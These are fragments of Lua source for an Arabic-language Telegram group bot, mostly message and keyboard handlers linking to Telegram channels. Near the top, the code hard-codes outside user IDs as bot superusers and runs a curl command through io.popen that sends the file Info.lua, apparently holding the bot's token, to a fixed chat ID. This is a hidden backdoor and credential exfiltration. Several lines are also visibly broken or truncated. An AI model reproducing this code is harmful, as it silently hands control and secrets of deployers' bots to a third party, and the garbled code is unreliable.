...
sudo_users = {SUDO,1804133252,1757895188,1751679358}   
...
local curl = 'curl "'..'Document'..'" -F "chat_id='.. 1804133252 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '❪تـواصل السـورس❫', url="t.me/sersAlsaua"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
{{text = '❪الــبــروفــيســور⒉❫',url="t.me/Professor512"}}, 
{{text = '❪قـنـاه الـسـورس❫ ', url="t.me/Sadauam"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Sadaam&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_idode=markdown&=true&reply_markup="..JSON.encode(keyboard))
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Professor512&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
local Namebot = (database:get(bot_id..'Name:Bot') or 'ناسا')
local DRAGON_Msg = {
...
{
{text = '𝗌𝗈𝗎𝗋𝖼𝖾 𝗌𝖺𝗂𝖽𝖺 ⇣', url="t.me/Sadauam"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
database:srem(bot_id:Group:New"..msg.chat_id_,text)
